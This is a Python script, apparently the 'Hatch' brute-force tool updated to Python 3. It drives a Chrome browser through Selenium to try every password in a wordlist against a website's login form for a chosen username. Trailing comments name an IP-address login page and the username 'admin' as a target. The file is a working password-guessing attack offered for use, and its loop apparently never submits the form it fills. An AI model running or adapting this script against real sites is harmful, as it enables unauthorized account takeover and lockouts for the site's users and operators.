import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import chromedriver_autoinstaller  # Import chromedriver_autoinstaller module
from selenium.webdriver.common.by import By

# Graphics
class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CWHITE = '\33[37m'

# Config
parser = OptionParser()
now = datetime.datetime.now()

# Args
parser.add_option("-u", "--username", dest="username", help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel", help="Choose the username selector")
parser.add_option("--passsel", dest="passsel", help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel", help="Choose the login button selector")
parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
parser.add_option("--website", dest="website", help="Choose a website")
(options, args) = parser.parse_args()

# Automatically download and install chromedriver if necessary
chromedriver_autoinstaller.install()

def wizard():
    print(banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    sys.stdout.write(color.GREEN + '[!] ' + color.CWHITE + 'Checking if site exists ')
    sys.stdout.flush()
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(color.GREEN + '[OK]' + color.CWHITE)
            sys.stdout.flush()
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print(color.RED + '[!]' + color.CWHITE + 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print(color.RED + '[X]' + color.CWHITE)
        t.sleep(1)
        print(color.RED + '[!]' + color.CWHITE + ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    pass_list = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)

def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    f = open(pass_list, 'r')
    optionss = webdriver.ChromeOptions()  # Changed from driver to optionss to define options correctly
    optionss.add_argument("--disable-popup-blocking")
    optionss.add_argument("--disable-extensions")
    count = 1  # count
    browser = webdriver.Chrome(options=optionss)  # Changed to pass options
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(0.1)
                Sel_user = browser.find_element(By.CSS_SELECTOR,username_selector)
                Sel_pas = browser.find_element(By.CSS_SELECTOR,password_selector)
                enter = browser.find_element(By.CSS_SELECTOR,login_btn_selector)
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                t.sleep(0.1)
                print('------------------------')
                print(color.GREEN + 'Tried password: ' + color.RED + line + color.GREEN + 'for user: ' + color.RED + username)
                print('------------------------')
                temp = line
        except KeyboardInterrupt:
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print('LAST PASS ATTEMPT BELLOW')
            print(color.GREEN + 'Password has been found: {0}'.format(temp))
            print(color.YELLOW + 'Have fun :)')
            exit()

banner = color.BOLD + color.PURPLE + '''
  _    _       _       _
 | |  | |     | |     | |
 | |__| | __ _| |_ ___| |__
 |  __  |/ _` | __/ __| '_ \\
 | |  | | (_| | || (__| | | |
 |_|  |_|\__,_|\__\___|_| |_|
  {0}[{1}-{2}]--> {3}V.1.0
  {4}[{5}-{6}]--> {7}coded by Metachar
  {8}[{9}-{10}]--> {11}Fixed and Updated to Py3 by {12}Blues Hailfire
  {13}[{14}-{15}]--> {16}Brute-Force Tool (For Websites)                     '''.format(color.RED, color.CWHITE, color.RED, color.GREEN, color.RED, color.CWHITE, color.RED, color.GREEN, color.RED, color.CWHITE, color.RED, color.GREEN, color.BLUE, color.RED, color.CWHITE, color.RED, color.GREEN)

if options.username == None:
    if options.usernamesel == None:
        if options.passsel == None:
            if options.loginsel == None:
                if options.passlist == None:
                    if options.website == None:
                        wizard()
username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
pass_list = options.passlist
print(banner)
brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website)
#Site: http://172.234.24.134/login
#UserField: #name
#PassField:#password
#Login Button: #_submit
#Username: admin Dummy halflife
#D:\Python Tools\Hatch-master\Hatch-master\passlist.txt
